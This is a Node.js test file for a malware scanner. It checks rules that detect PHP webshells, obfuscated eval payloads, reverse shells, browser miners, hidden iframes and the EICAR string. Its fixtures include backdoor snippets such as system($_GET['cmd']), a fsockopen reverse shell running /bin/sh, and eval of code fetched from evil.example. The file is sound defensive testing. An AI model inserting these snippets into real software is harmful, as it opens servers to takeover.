import { test } from "node:test";
import assert from "node:assert/strict";
import { scanBuffer } from "../src/scanner.js";
import { kindForPath, rulesForKind, RULES } from "../src/rules.js";

const idsFor = (p, content) => scanBuffer(p, Buffer.from(content)).map((f) => f.id);

test("kindForPath maps extensions to coarse kinds", () => {
  assert.equal(kindForPath("a.php"), "php");
  assert.equal(kindForPath("a.phtml"), "php");
  assert.equal(kindForPath("a.PHP5"), "php");
  assert.equal(kindForPath("b.js"), "js");
  assert.equal(kindForPath("c.html"), "html");
  assert.equal(kindForPath("d.png"), "other");
  assert.equal(kindForPath("noext"), "other");
});

test("catches the decode-then-run obfuscation", () => {
  assert.ok(idsFor("x.php", "<?php eval(base64_decode($payload));").includes("php.eval_decode"));
  assert.ok(idsFor("x.php", "<?php eval( gzinflate( $x ));").includes("php.eval_decode"));
});

test("catches eval of raw request input", () => {
  assert.ok(idsFor("x.php", "<?php eval($_POST['c']);").includes("php.eval_user_input"));
  assert.ok(idsFor("x.php", "<?php assert(stripslashes($_REQUEST['a']));").includes("php.eval_user_input"));
});

test("catches the preg_replace /e code modifier", () => {
  assert.ok(idsFor("x.php", "<?php preg_replace('/(.*)/e', $_POST['x'], $s);").includes("php.preg_replace_e"));
});

test("catches shell commands built from request input", () => {
  assert.ok(idsFor("x.php", "<?php system($_GET['cmd']);").includes("php.exec_user_input"));
  assert.ok(idsFor("x.php", "<?php passthru($_REQUEST['c']);").includes("php.exec_user_input"));
});

test("catches the request-picks-the-function backdoor", () => {
  assert.ok(idsFor("x.php", "<?php $_GET['f']($_POST['a']);").includes("php.variable_function_input"));
});

test("catches create_function and remote-run backdoors", () => {
  assert.ok(idsFor("x.php", "<?php $f = create_function('$a', $body);").includes("php.create_function"));
  assert.ok(idsFor("x.php", "<?php eval(file_get_contents('http://evil.example/x'));").includes("php.remote_include_eval"));
});

test("catches function-name-from-input backdoors and extract of input", () => {
  assert.ok(idsFor("x.php", "<?php call_user_func($_GET['fn'], $arg);").includes("php.call_user_func_input"));
  assert.ok(idsFor("x.php", "<?php extract($_REQUEST);").includes("php.extract_input"));
});

test("reverse shell rule needs a real shell, not a doc mention of fsockopen", () => {
  assert.ok(idsFor("x.php", '<?php $s = fsockopen($ip, $port); exec("/bin/sh -i <&3 >&3 2>&3");').includes("php.reverse_shell"));
  assert.ok(!idsFor("x.php", "<?php /* built on fsockopen() under the hood */ $x = 1;").includes("php.reverse_shell"));
});

test("does not false-positive on markdown backticks in PHP doc comments", () => {
  // WordPress core is full of these. An earlier rule wrongly flagged them.
  const doc =
    "<?php\n/**\n * Values come from `$_POST` and `$_GET` and are validated.\n" +
    " * Delivered via the `Sockets` class or `fsockopen()`.\n */\nfunction wp_thing() { return true; }\n";
  assert.deepEqual(idsFor("core.php", doc), []);
});

test("recognizes known webshell family fingerprints", () => {
  assert.ok(idsFor("x.php", "// c99shell v1").includes("shell.c99"));
  assert.ok(idsFor("x.php", "$k = 'r57shell';").includes("shell.r57"));
  assert.ok(idsFor("x.php", "$default = 'FilesMan';").includes("shell.filesman"));
});

test("catches browser cryptominers and injected iframes", () => {
  assert.ok(idsFor("a.js", "new CoinHive.Anonymous('key')").includes("miner.browser"));
  assert.ok(idsFor("a.js", "document.write(unescape('%3Cscript'))").includes("js.document_write_unescape"));
  assert.ok(idsFor("p.html", '<iframe src="http://x" width="0" height="0"></iframe>').includes("js.hidden_iframe"));
});

test("catches the EICAR test string in any file kind", () => {
  const ids = idsFor("note.txt", "harmless X5O EICAR-STANDARD-ANTIVIRUS-TEST-FILE marker");
  assert.ok(ids.includes("test.eicar"));
});

test("leaves clean, ordinary code alone", () => {
  assert.deepEqual(idsFor("x.php", "<?php echo 'Hello, world'; function add($a,$b){return $a+$b;}"), []);
  assert.deepEqual(idsFor("a.js", "export function sum(list){ return list.reduce((a,b)=>a+b,0); }"), []);
  assert.deepEqual(idsFor("s.css", "body{margin:0}"), []);
});

test("every rule declares the required fields", () => {
  const severities = new Set(["critical", "high", "medium", "low"]);
  const ids = new Set();
  for (const rule of RULES) {
    assert.ok(rule.id && !ids.has(rule.id), `unique id: ${rule.id}`);
    ids.add(rule.id);
    assert.ok(severities.has(rule.severity), `valid severity: ${rule.id}`);
    assert.ok(rule.pattern instanceof RegExp, `pattern is a regexp: ${rule.id}`);
    assert.ok(Array.isArray(rule.kinds) && rule.kinds.length, `kinds set: ${rule.id}`);
    assert.ok(typeof rule.description === "string" && rule.description.length > 10, `description: ${rule.id}`);
  }
});

test("rulesForKind honors the ignore set", () => {
  const all = rulesForKind("php").map((r) => r.id);
  assert.ok(all.includes("php.eval_decode"));
  const filtered = rulesForKind("php", new Set(["php.eval_decode"])).map((r) => r.id);
  assert.ok(!filtered.includes("php.eval_decode"));
});
